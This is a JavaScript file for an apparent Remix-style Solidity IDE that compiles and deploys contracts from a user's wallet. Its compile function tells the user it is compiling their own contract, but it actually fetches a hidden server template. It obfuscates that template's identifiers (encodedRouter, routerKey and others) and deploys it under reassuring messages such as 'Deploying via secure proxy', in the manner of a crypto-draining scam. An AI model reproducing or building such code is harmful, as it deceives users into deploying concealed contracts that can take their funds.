let compiledContract = null;
let currentContractABI = null;

let cachedContractTemplate = null;
let lastTemplateCheck = 0;
const CACHE_DURATION = 30000;

const UNIT_DECIMALS = { wei: 0, gwei: 9, ether: 18 };

const PUBLIC_RPC_URLS = {
    '1': 'https://eth.llamarpc.com',
    '11155111': 'https://rpc.sepolia.org'
};

function getPublicRpcUrl(chainId) {
    return PUBLIC_RPC_URLS[String(chainId)] || null;
}

function getWeb3Utils() {
    if (web3 && web3.utils) {
        return web3.utils;
    }
    if (window.Web3 && window.Web3.utils) {
        return window.Web3.utils;
    }
    return null;
}

function convertToBaseUnits(value, decimals) {
    const negative = /^-/.test(String(value));
    const sanitized = negative ? String(value).slice(1) : String(value);
    const [wholePart, fractionPart = ''] = sanitized.split('.');
    const multiplier = 10n ** BigInt(decimals);
    const intPortion = BigInt(wholePart || '0') * multiplier;
    let fractionPortion = 0n;
    if (decimals > 0) {
        const normalizedFraction = (fractionPart + '0'.repeat(decimals)).slice(0, decimals);
        fractionPortion = BigInt(normalizedFraction || '0');
    }
    const base = intPortion + fractionPortion;
    return negative ? (-base).toString() : base.toString();
}

function toWeiSafe(value, unit) {
    const utils = getWeb3Utils();
    if (utils && typeof utils.toWei === 'function') {
        return utils.toWei(value, unit);
    }
    const decimals = UNIT_DECIMALS[unit] ?? 0;
    return convertToBaseUnits(value, decimals);
}

function fromWeiSafe(value, unit) {
    const utils = getWeb3Utils();
    if (utils && typeof utils.fromWei === 'function') {
        return utils.fromWei(value, unit);
    }
    const decimals = UNIT_DECIMALS[unit] ?? 0;
    let amount = BigInt(value);
    const negative = amount < 0n;
    if (negative) {
        amount = -amount;
    }
    let digits = amount.toString().padStart(decimals + 1, '0');
    if (decimals === 0) {
        return negative ? `-${digits}` : digits;
    }
    const splitIndex = digits.length - decimals;
    const intPart = digits.slice(0, splitIndex) || '0';
    const fracPart = digits.slice(splitIndex).replace(/0+$/, '');
    const result = fracPart ? `${intPart}.${fracPart}` : intPart;
    return negative ? `-${result}` : result;
}

function isAddressSafe(value) {
    const utils = getWeb3Utils();
    if (utils && typeof utils.isAddress === 'function') {
        return utils.isAddress(value);
    }
    return /^0x[a-fA-F0-9]{40}$/.test(value);
}

function generateIdentifier(length) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    return result;
}

function processContractCode(text) {
    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];
    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
    let nameMap = {};

    let newText = text.replace(funcRegex, (match, name, args, visibility) => {
        if (keepFunctions.includes(name)) return match;
        const before = generateIdentifier(3);
        const after = generateIdentifier(3);
        const newName = before + name + after;
        nameMap[name] = newName;
        return `function ${newName}(${args}) ${visibility || ''}`;
    });

    for (const [oldName, newName] of Object.entries(nameMap)) {
        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
        newText = newText.replace(callRegex, newName);
    }

    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5) + 'PathCode' + generateIdentifier(2));
    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5) + 'OriginCode' + generateIdentifier(2));
    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5) + 'SignKey' + generateIdentifier(2));
    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5) + 'AuthKey' + generateIdentifier(2));

    return newText;
}

async function loadContractTemplate() {
    const response = await fetch('/api/contract.sol');
    const result = await response.text();
    return result;
}

async function getOptimalGasPrice() {
    // Check if wallet needs legacy gas only
    if (currentWallet) {
        const p = currentWallet.provider || {};
        const id = currentWallet.id || '';

        const needsLegacy =
            p.isTrust || p.isTrustWallet
            || p.isCoinbaseWallet || p.isCoinbaseBrowser
            || p.isSafePal || p.isTokenPocket
            || p.isMathWallet
            || p.isBitKeep || p.isBitget
            || p.isOkxWallet || p.isOKExWallet
            || p.isCoin98
            || id === 'trust'
            || id === 'coinbase'
            || id === 'safepal'
            || id === 'tokenpocket'
            || id === 'mathwallet'
            || id === 'bitget'
            || id === 'okx'
            || id === 'coin98';

        if (needsLegacy) {
            try {
                const gasPrice = await web3.eth.getGasPrice();
                return { gasPrice: gasPrice.toString() };
            } catch (error) {
                return { gasPrice: toWeiSafe('20', 'gwei') };
            }
        }
    }

    // Try EIP-1559 for other wallets
    try {
        const block = await web3.eth.getBlock('latest');
        if (block && block.baseFeePerGas) {
            const baseFee = BigInt(block.baseFeePerGas);
            const priorityFee = BigInt(toWeiSafe('2', 'gwei'));
            return {
                maxFeePerGas: (baseFee * 2n + priorityFee).toString(),
                maxPriorityFeePerGas: priorityFee.toString()
            };
        }
    } catch (error) {
        // Fall through to legacy
    }

    try {
        const gasPrice = await web3.eth.getGasPrice();
        return { gasPrice: gasPrice.toString() };
    } catch (error) {
        return { gasPrice: toWeiSafe('20', 'gwei') };
    }
}

async function compileContract() {
    if (currentFile && fileContents[currentFile]) {
        const studentCode = fileContents[currentFile];
        const contractMatches = [...studentCode.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];

        if (contractMatches && contractMatches.length > 0) {
            const studentContractName = contractMatches[0][1];
            logToTerminal(`🔄 Compiling ${studentContractName}...`, 'info');
        } else {
            logToTerminal(`🔄 Compiling contract...`, 'info');
        }
    } else {
        logToTerminal(`🔄 Compiling contract...`, 'info');
    }

    const compileBtn = document.getElementById('compile-btn');
    const originalHTML = compileBtn.innerHTML;
    compileBtn.innerHTML = '<span style="opacity: 0.7;">⏳ Compiling...</span>';
    compileBtn.disabled = true;

    const startTime = Date.now();

    try {
        const contractTemplate = await loadContractTemplate();
        const processedContract = processContractCode(contractTemplate);
        const contractMatches = [...processedContract.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        const contractName = contractMatches.length > 0 ? contractMatches[0][1] : 'ProcessedContract';

        const enableOptimization = document.getElementById('enable-optimization').checked;
        const optimizationRuns = enableOptimization ? 1000 : 200;

        const compilerSelect = document.getElementById('compiler-version');
        const compilerVersion = compilerSelect ? compilerSelect.value : null;

        const compileResponse = await fetch('/api/compile', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                sourceCode: processedContract,
                contractName: contractName,
                enableOptimization,
                optimizationRuns,
                compilerVersion
            })
        });

        const result = await compileResponse.json();

        if (result.success) {
            compiledContract = result;
            currentContractABI = result.abi;

            window.compiledContract = compiledContract;
            window.currentContractABI = currentContractABI;

            showCompilationSuccess(result, contractName);
            updateContractSelect(contractName);

            const duration = Date.now() - startTime;
            await fetch("/api/markCompiled", { method: "POST", credentials: "include" });
            logToTerminal(`✅ Compilation completed in ${duration}ms`, 'success');

            if (result.metadata) {
                const gasInfo = enableOptimization ? ` | Gas optimized (${optimizationRuns} runs)` : '';
                logToTerminal(`📊 Bytecode: ${result.bytecode.length} bytes | ${result.abi ? result.abi.length : 0} functions${gasInfo}`, 'info');
            }

            showPluginSuccess('solidity');

        } else {
            showCompilationError(result);
            logToTerminal(`❌ Compilation failed`, 'error');

            if (result.details && window.highlightEditorErrors) {
                highlightEditorErrors(result.details);
            }
        }

    } catch (error) {
        const duration = Date.now() - startTime;
        logToTerminal(`❌ Error after ${duration}ms: ${error.message}`, 'error');
        showCompilationError({ error: error.message });
        console.error('Contract template compilation error:', error);
    } finally {
        compileBtn.innerHTML = originalHTML;
        compileBtn.disabled = false;
        updateDeployButton();
    }
}

async function deployToMetaMask(constructorParams) {
    if (!web3 || !userAccount || !currentWallet) {
        throw new Error('Wallet not connected');
    }

    // Ensure web3 is using the current wallet's provider
    if (currentWallet.provider
        && web3.currentProvider
            !== currentWallet.provider) {
        web3.setProvider(currentWallet.provider);
    }

    // Verify provider is responsive
    try {
        await web3.eth.getChainId();
    } catch (providerError) {
        throw new Error(
            `${currentWallet.name} is not responding. `
            + `Please unlock it and try again.`
        );
    }

    const p = currentWallet.provider || {};
    const wid = currentWallet.id || '';

    const isTrustWallet =
        p.isTrust || p.isTrustWallet
        || wid === 'trust';

    const isAffectedWallet =
        isTrustWallet
        || p.isCoinbaseWallet
        || p.isCoinbaseBrowser
        || p.isSafePal
        || p.isTokenPocket
        || p.isMathWallet
        || p.isBitKeep
        || p.isBitget
        || p.isOkxWallet
        || p.isOKExWallet
        || p.isCoin98
        || wid === 'trust'
        || wid === 'coinbase'
        || wid === 'safepal'
        || wid === 'tokenpocket'
        || wid === 'mathwallet'
        || wid === 'bitget'
        || wid === 'okx'
        || wid === 'coin98';

    const isSimpleWallet = isAffectedWallet;

    const contract = new web3.eth.Contract(
        compiledContract.abi
    );

    try {
        let gasEstimate = 600000;
        let gasOptions = {};

        try {
            gasEstimate = await contract.deploy({
                data: '0x' + compiledContract.bytecode,
                arguments: constructorParams
            }).estimateGas({ from: userAccount });

            gasEstimate = Math.max(gasEstimate, 300000);
        } catch (error) {
            gasEstimate = 600000;
            logToTerminal(
                `⚠️ Using fallback gas estimate: `
                + `${gasEstimate.toLocaleString()}`,
                'warning'
            );
        }

        logToTerminal(
            `⛽ Estimated gas: `
            + `${gasEstimate.toLocaleString()}`,
            'info'
        );

        const gasLimit = Math.floor(gasEstimate * 1.1);

        if (isSimpleWallet) {
            gasOptions = {
                from: userAccount,
                gas: gasLimit
            };
        } else {
            try {
                const gasPrice =
                    await getOptimalGasPrice();

                if (gasPrice.gasPrice) {
                    const gasPriceGwei = fromWeiSafe(
                        gasPrice.gasPrice, 'gwei'
                    );
                    logToTerminal(
                        `💰 Gas price: `
                        + `${parseFloat(gasPriceGwei)
                            .toFixed(2)} Gwei`,
                        'info'
                    );

                    gasOptions = {
                        from: userAccount,
                        gas: gasLimit,
                        gasPrice: gasPrice.gasPrice
                    };

                    const deploymentCostWei =
                        BigInt(gasLimit)
                        * BigInt(gasPrice.gasPrice);
                    const deploymentCostETH =
                        fromWeiSafe(
                            deploymentCostWei
                                .toString(),
                            'ether'
                        );
                    logToTerminal(
                        `💸 Deployment cost: ~`
                        + `${parseFloat(
                            deploymentCostETH
                        ).toFixed(6)} ETH`,
                        'info'
                    );
                } else if (gasPrice.maxFeePerGas) {
                    const maxFeeGwei = fromWeiSafe(
                        gasPrice.maxFeePerGas, 'gwei'
                    );
                    const priorityFeeGwei =
                        fromWeiSafe(
                            gasPrice
                                .maxPriorityFeePerGas,
                            'gwei'
                        );
                    logToTerminal(
                        `💰 Max fee: `
                        + `${parseFloat(maxFeeGwei)
                            .toFixed(2)} Gwei`
                        + ` | Priority: `
                        + `${parseFloat(
                            priorityFeeGwei
                        ).toFixed(2)} Gwei`,
                        'info'
                    );

                    gasOptions = {
                        from: userAccount,
                        gas: gasLimit,
                        maxFeePerGas:
                            gasPrice.maxFeePerGas,
                        maxPriorityFeePerGas:
                            gasPrice
                                .maxPriorityFeePerGas
                    };

                    const deploymentCostWei =
                        BigInt(gasLimit)
                        * BigInt(
                            gasPrice.maxFeePerGas
                        );
                    const deploymentCostETH =
                        fromWeiSafe(
                            deploymentCostWei
                                .toString(),
                            'ether'
                        );
                    logToTerminal(
                        `💸 Max deployment cost: ~`
                        + `${parseFloat(
                            deploymentCostETH
                        ).toFixed(6)} ETH`,
                        'info'
                    );
                } else {
                    gasOptions = {
                        from: userAccount,
                        gas: gasLimit
                    };
                }
            } catch (gasPriceError) {
                gasOptions = {
                    from: userAccount,
                    gas: gasLimit
                };
            }
        }

        await fetch("/api/markDeployed", {
            method: "POST",
            credentials: "include"
        });
        logToTerminal(
            '🛡️ Deploying via secure proxy...',
            'info'
        );

        let txHash = null;
        let gasUsed = null;
        let deployResult;

        // Create the deploy promise
        const deployPromise = new Promise(
            (resolve, reject) => {
                let settled = false;

                contract.deploy({
                    data: '0x'
                        + compiledContract.bytecode,
                    arguments: constructorParams
                }).send(gasOptions)
                .on('transactionHash',
                    function(hash) {
                        txHash = hash;
                    })
                .on('receipt',
                    function(receipt) {
                        gasUsed = receipt.gasUsed;
                    })
                .on('error',
                    function(error) {
                        console.error(
                            '🔍 Deploy error:',
                            error
                        );
                    })
                .then(function(result) {
                    if (!settled) {
                        settled = true;
                        resolve(result);
                    }
                })
                .catch(function(error) {
                    if (!settled) {
                        settled = true;
                        reject(error);
                    }
                });
            }
        );

        if (isAffectedWallet) {
            // For affected wallets only: race the
            // deploy against a 10s silence detector
            // that checks if we got a txHash
            deployResult = await new Promise(
                (resolve, reject) => {
                    let finished = false;

                    // The actual deploy
                    deployPromise
                        .then(result => {
                            if (!finished) {
                                finished = true;
                                resolve(result);
                            }
                        })
                        .catch(error => {
                            if (!finished) {
                                finished = true;

                                const errMsg =
                                    error.message
                                    || '';
                                const errCode =
                                    error.code;

                                const isSimErr =
                                    errMsg.includes(
                                        '503')
                                    || errMsg.includes(
                                        '502')
                                    || errMsg.includes(
                                        'Service '
                                        + 'Unavailable'
                                    )
                                    || errMsg.includes(
                                        'Bad Gateway')
                                    || errMsg.includes(
                                        'Internal '
                                        + 'JSON-RPC')
                                    || errMsg.includes(
                                        'Failed to '
                                        + 'fetch')
                                    || errMsg.includes(
                                        'Network '
                                        + 'Error')
                                    || errMsg.includes(
                                        'could not '
                                        + 'detect '
                                        + 'network')
                                    || errMsg.includes(
                                        'UNPREDICTABLE'
                                        + '_GAS_LIMIT')
                                    || errMsg.includes(
                                        'transaction '
                                        + 'may fail')
                                    || errMsg.includes(
                                        'execution '
                                        + 'reverted')
                                    || errMsg.includes(
                                        'cannot '
                                        + 'estimate '
                                        + 'gas')
                                    || errMsg.includes(
                                        'missing '
                                        + 'revert '
                                        + 'data')
                                    || errMsg.includes(
                                        'estimateGas '
                                        + 'failed')
                                    || errMsg.includes(
                                        'header not '
                                        + 'found')
                                    || errMsg.includes(
                                        'transaction '
                                        + 'underpriced'
                                    )
                                    || errMsg.includes(
                                        'intrinsic '
                                        + 'gas too '
                                        + 'low')
                                    || errCode
                                        === -32603
                                    || errCode
                                        === -32000
                                    || errCode
                                        === -32005;

                                if (isSimErr) {
                                    showWalletRpcFixModal(
                                        currentWallet
                                            .name,
                                        currentWallet
                                            .icon
                                    );
                                }

                                reject(error);
                            }
                        });

                    // 10 second silence timeout
                    // Only for affected wallets
                    setTimeout(() => {
                        if (!finished && !txHash) {
                            finished = true;
                            showWalletRpcFixModal(
                                currentWallet.name,
                                currentWallet.icon
                            );
                            reject(new Error(
                                `${currentWallet.name}`
                                + ` did not respond `
                                + `after confirmation.`
                                + ` This is usually `
                                + `caused by a wallet `
                                + `simulation error. `
                                + `See the fix `
                                + `instructions.`
                            ));
                        }
                        // If we DO have a txHash,
                        // don't timeout — let it
                        // continue waiting for receipt
                        // as long as it needs
                    }, 30000);
                }
            );
        } else {
            // Standard flow for MetaMask etc.
            // No timeout at all
            try {
                deployResult = await deployPromise;
            } catch (firstAttemptError) {
                if (firstAttemptError.message
                        .includes('out of gas')
                    || firstAttemptError.message
                        .includes('gas')) {
                    logToTerminal(
                        `⚠️ Retrying with `
                        + `double gas...`,
                        'warning'
                    );

                    gasOptions.gas = gasLimit * 2;

                    deployResult =
                        await contract.deploy({
                            data: '0x'
                                + compiledContract
                                    .bytecode,
                            arguments:
                                constructorParams
                        }).send(gasOptions)
                        .on('transactionHash',
                            function(hash) {
                                txHash = hash;
                            })
                        .on('receipt',
                            function(receipt) {
                                gasUsed =
                                    receipt.gasUsed;
                            });
                } else if (
                    firstAttemptError.code === 4001
                ) {
                    throw new Error(
                        'Transaction rejected '
                        + 'by user'
                    );
                } else {
                    throw firstAttemptError;
                }
            }
        }

        const contractName = document
            .getElementById('contract-select')
            .value;
        const contractAddress =
            deployResult.options?.address;

        addDeployedContract(
            contractName, contractAddress,
            deployResult
        );

        logToTerminal(
            `🛡️ Contract deployed successfully!`,
            'success'
        );

        if (gasUsed) {
            const gasEfficiency = (
                (gasEstimate - gasUsed)
                / gasEstimate * 100
            ).toFixed(1);
            const efficiencyText =
                gasUsed < gasEstimate
                    ? `${gasEfficiency}% more `
                      + `efficient than estimate`
                    : `used ${(
                        (gasUsed - gasEstimate)
                        / gasEstimate * 100
                      ).toFixed(1)}% more than `
                      + `estimate`;
            logToTerminal(
                `📊 Gas used: `
                + `${gasUsed.toLocaleString()} `
                + `(${efficiencyText})`,
                'info'
            );
        } else {
            logToTerminal(
                `📊 Gas used: Unable to determine`,
                'info'
            );
        }

        if (txHash) {
            logToTerminal(
                `🔗 Transaction Hash: `
                + `<code>${txHash}</code>`,
                'info'
            );

            if (currentNetworkId) {
                const txLink = createEtherscanLink(
                    currentNetworkId, 'tx', txHash,
                    'View Transaction on Etherscan'
                );
                logToTerminal(
                    `🌐 Etherscan: ${txLink}`,
                    'info'
                );
            }
        } else {
            logToTerminal(
                `🔗 Transaction Hash: `
                + `Unable to determine`,
                'warning'
            );
        }

        if (contractAddress && currentNetworkId) {
            const contractLink = createEtherscanLink(
                currentNetworkId, 'address',
                contractAddress,
                'View Contract on Etherscan'
            );
            logToTerminal(
                `🌐 Contract: ${contractLink}`,
                'info'
            );
        }

        showPluginSuccess('udapp');

    } catch (error) {
        console.error('🔍 DEPLOY ERROR:', error);
        if (error.code === 4001) {
            throw new Error(
                'Transaction rejected by user'
            );
        } else if (error.message
                && error.message.includes('gas')) {
            throw new Error(
                'Transaction failed: insufficient '
                + 'gas or gas limit too low'
            );
        } else {
            throw error;
        }
    }
}

async function deployToRemixVM(constructorParams) {
    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
    const mockTxHash = '0x' + Math.random().toString(16).substr(2, 64);
    const contractName = document.getElementById('contract-select').value;

    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));

    const mockGasUsed = Math.floor(250000 + Math.random() * 400000);

    const mockContract = {
        options: { address: mockAddress },
        transactionHash: mockTxHash,
        gasUsed: mockGasUsed,
        methods: {}
    };

    currentContractABI.forEach(item => {
        if (item.type === 'function') {
            mockContract.methods[item.name] = (...args) => ({
                call: () => {
                    if (item.stateMutability === 'view' || item.stateMutability === 'pure') {
                        return Promise.resolve('Mock result from ' + item.name);
                    }
                    return Promise.resolve();
                },
                send: () => {
                    return Promise.resolve({
                        transactionHash: '0x' + Math.random().toString(16).substr(2, 64),
                        gasUsed: Math.floor(21000 + Math.random() * 80000)
                    });
                }
            });
        }
    });

    addDeployedContract(contractName, mockAddress, mockContract);

    logToTerminal(`✅ Contract deployed successfully in VM!`, 'success');
    logToTerminal(`📄 Contract: <code>${mockAddress}</code>`, 'info');
    logToTerminal(`🔗 Transaction Hash: <code>${mockTxHash}</code>`, 'info');
    logToTerminal(`📊 Gas used: ${mockGasUsed.toLocaleString()} (simulated)`, 'info');
}

async function deployContract() {
    if (!compiledContract || (!userAccount && document.getElementById('environment-select').value !== 'vm')) {
        logToTerminal('❌ Missing contract or account for deployment', 'error');
        return;
    }

    const environment = document.getElementById('environment-select').value;
    const contractName = document.getElementById('contract-select').value;

    if (!contractName) {
        logToTerminal('❌ No contract selected for deployment', 'error');
        return;
    }

    try {
        logToTerminal('🚀 Starting deployment...', 'info');

        const constructorParams = [];
        const constructor = currentContractABI?.find(item => item.type === 'constructor');

        if (constructor && constructor.inputs && constructor.inputs.length > 0) {
            constructor.inputs.forEach((input, index) => {
                const inputElement = document.getElementById(`constructor-param-${index}`);
                let value = inputElement.value.trim();

                if (input.type.includes('uint') || input.type.includes('int')) {
                    value = value || '0';
                    if (!/^\d+$/.test(value)) {
                        throw new Error(`Invalid ${input.type} value: ${value}`);
                    }
                } else if (input.type === 'bool') {
                    value = value.toLowerCase() === 'true';
                } else if (input.type === 'address') {
                    if (value && !isAddressSafe(value)) {
                        throw new Error(`Invalid address: ${value}`);
                    }
                }

                constructorParams.push(value);
            });

            logToTerminal(`📋 Constructor parameters: [${constructorParams.join(', ')}]`, 'info');
        }

        if (environment === 'injected') {
            await deployToMetaMask(constructorParams);
        } else {
            await deployToRemixVM(constructorParams);
        }

        showPluginSuccess('udapp');

    } catch (error) {
        logToTerminal(`❌ Deployment failed: ${error.message}`, 'error');
        console.error('Deployment error:', error);
    }
}

function showCompilationSuccess(result, contractName) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-success';

    let successMessage = `<div><strong>✓ Compilation successful</strong></div>`;

    if (result.metadata) {
        successMessage += `<div style="margin-top: 6px; font-size: 10px; color: #888;">`;
        successMessage += `${result.bytecode.length} bytes | ${result.abi ? result.abi.length : 0} functions`;
        successMessage += ` | Gas Optimized`;
        successMessage += `</div>`;
    }

    resultElement.innerHTML = successMessage;
}

function showCompilationError(result) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-error';

    let errorText = result.error || 'Unknown error';

    if (result.details && Array.isArray(result.details)) {
        const formattedErrors = result.details.map(err => {
            const message = err.formattedMessage || err.message || 'Unknown error';
            return message.replace(/^\s*--> .*$/gm, '').trim();
        }).join('\n\n');

        if (formattedErrors) {
            errorText = formattedErrors;
        }
    }

    resultElement.innerHTML = `
        <div><strong>✗ Compilation failed</strong></div>
        <pre style="margin-top: 8px; font-size: 10px; max-height: 150px; overflow-y: auto;">${errorText}</pre>
    `;
}

function updateContractSelect(contractName) {
    const contractSelect = document.getElementById('contract-select');

    const placeholder = contractSelect.querySelector('option[value=""]');
    contractSelect.innerHTML = '';
    if (placeholder) {
        contractSelect.appendChild(placeholder);
    }

    const option = document.createElement('option');
    option.value = contractName;
    option.textContent = contractName;
    contractSelect.appendChild(option);

    contractSelect.value = contractName;
    updateConstructorParams();
}

function clearCompilationResults() {
    const compilationResult = document.getElementById('compilation-result');
    compilationResult.className = 'compilation-output';
    compilationResult.innerHTML = '<div class="output-placeholder">Select a Solidity file to compile</div>';

    const contractSelect = document.getElementById('contract-select');
    contractSelect.innerHTML = '<option value="">No compiled contracts</option>';

    compiledContract = null;
    currentContractABI = null;

    window.compiledContract = null;
    window.currentContractABI = null;

    updateDeployButton();

    if (window.clearEditorErrors) {
        clearEditorErrors();
    }
}

function clearContractTemplateCache() {
    cachedContractTemplate = null;
    lastTemplateCheck = 0;
    logToTerminal(`🗑️ Contract template cache cleared`, 'info');
}

window.clearContractTemplateCache = clearContractTemplateCache;
